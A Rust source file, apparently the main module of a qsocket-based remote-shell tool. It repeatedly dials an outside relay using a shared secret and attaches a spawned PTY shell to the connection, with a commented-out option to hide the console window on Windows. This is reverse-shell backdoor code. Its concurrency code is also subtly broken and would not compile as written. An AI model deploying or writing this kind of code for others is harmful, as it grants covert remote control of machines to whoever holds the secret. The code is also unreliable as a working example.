//#![windows_subsystem = "windows"]

use anyhow::{anyhow, Ok};
// use anyhow::Result;
// use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::io::prelude::*;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time;
use std::time::Duration;
mod options;
mod pty;
mod utils;

fn main() -> Result<(), anyhow::Error> {
    let mut opts = options::parse_options()?;

    if opts.generate {
        opts.secret = utils::random_secret();
    }

    if opts.secret.is_empty() {
        // Ask for secret.
        opts.secret = utils::read_line("Enter Secret (or press Enter to generate): ");
        if opts.secret.is_empty() {
            opts.secret = utils::random_secret();
        }
    }
    // print option summary
    options::summarize_options(&opts);
    start_probing_qsrn(&opts)?;

    Ok(())
} // the stream is closed here

fn start_probing_qsrn(opts: &options::Options) -> Result<(), anyhow::Error> {
    let mut first_run = true;

    loop {
        if !first_run {
            std::thread::sleep(time::Duration::from_secs(opts.probe as u64));
        }
        first_run = false;
        let mut qsock = qsocket_rs::Qsocket::new(&opts.secret, qsocket_rs::TAG_ID_NC);
        match qsock.dial(!opts.no_tls, opts.verify_cert) {
            std::result::Result::Ok(_) => (),
            Err(_) => continue,
        }
        qsock.set_write_timeout(Some(Duration::from_millis(100)))?;
        qsock.set_read_timeout(Some(Duration::from_millis(100)))?;
        // Init PTY shell
        let mut proc = pty::new(opts.exec.as_str())?;
        let mut reader = proc.pair.master.try_clone_reader()?;
        let mut writer = proc.pair.master.try_clone_writer()?;
        let reader = Arc::new(Mutex::new(reader));
        let writer = Arc::new(Mutex::new(writer));
        let qsock = Arc::new(Mutex::new(qsock));

        loop {
            copy_until(reader, qsock, Duration::from_millis(100));
            copy_until(qsock, writer, Duration::from_millis(100));
        }
    }
}

fn copy_until<S, D>(
    reader: &mut Mutex<S>,
    writer: &mut Mutex<D>,
    dur: std::time::Duration,
) -> Result<u64, anyhow::Error>
where
    S: Read + std::marker::Sync + std::marker::Send,
    D: Write + std::marker::Sync + std::marker::Send,
{
    let (sender, receiver) = std::sync::mpsc::channel();
    let t = thread::spawn(move || {
        match sender.send(std::io::copy(
            &mut *reader.lock().unwrap(),
            &mut *writer.lock().unwrap(),
        )) {
            std::result::Result::Ok(()) => {} // everything good
            Err(_) => {}                      // we have been released, don't panic
        }
    });
    drop(t);
    match receiver.recv_timeout(dur)? {
        std::result::Result::Ok(n) => Ok(n),
        Err(e) => Err(anyhow!(e)),
    }
}
